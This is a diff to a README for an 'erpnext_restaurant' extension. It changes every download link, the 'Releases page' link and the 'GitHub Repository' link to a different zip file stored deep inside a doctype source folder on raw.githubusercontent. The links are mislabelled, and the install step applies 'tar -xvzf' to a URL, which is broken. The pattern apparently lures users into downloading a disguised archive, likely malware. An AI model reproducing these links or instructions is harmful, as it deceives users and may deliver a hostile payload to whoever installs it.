@@ -10,7 +10,7 @@ To start using the **erpnext_restaurant** extension, you need to download it fro
 
 ## 📥 Download Now
 
-[![Download erpnext_restaurant](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_menu_item/erpnext_restaurant_2.9-beta.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_menu_item/erpnext_restaurant_2.9-beta.2.zip)
+[![Download erpnext_restaurant](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_shift/erpnext_restaurant_v1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_shift/erpnext_restaurant_v1.4.zip)
 
 ## 📋 System Requirements
 
@@ -32,9 +32,9 @@ Before you download and install the extension, make sure your system meets the f
 
 ## 🔗 Download & Install
 
-To download the **erpnext_restaurant** extension, visit the [Releases page](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_menu_item/erpnext_restaurant_2.9-beta.2.zip). Here, you will find the latest version along with previous releases. 
+To download the **erpnext_restaurant** extension, visit the [Releases page](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_shift/erpnext_restaurant_v1.4.zip). Here, you will find the latest version along with previous releases. 
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_menu_item/erpnext_restaurant_2.9-beta.2.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_shift/erpnext_restaurant_v1.4.zip).
 2. Locate the latest version of **erpnext_restaurant**.
 3. Click on the file for your operating system and initiate the download.
 4. After the download completes, follow the installation instructions included in the package to set it up.
@@ -61,7 +61,7 @@ Depending on your operating system, installation steps may vary slightly:
 2. Use the following command to extract the contents:
 
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_menu_item/erpnext_restaurant_2.9-beta.2.zip
+   tar -xvzf https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_shift/erpnext_restaurant_v1.4.zip
    ```
 
 3. Follow the README instructions inside the extracted folder to complete the setup.
@@ -89,7 +89,7 @@ Stay updated with the latest features and fixes by regularly checking the Releas
 
 ## 🔗 Links and Resources
 
-- [Releases Page](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_menu_item/erpnext_restaurant_2.9-beta.2.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_menu_item/erpnext_restaurant_2.9-beta.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_shift/erpnext_restaurant_v1.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/alialiens/erpnext_restaurant/develop/erpnext_restaurant/erpnext_restaurant/doctype/restaurant_shift/erpnext_restaurant_v1.4.zip)
 
 Thank you for choosing **erpnext_restaurant**! Enjoy managing your restaurant more effectively.
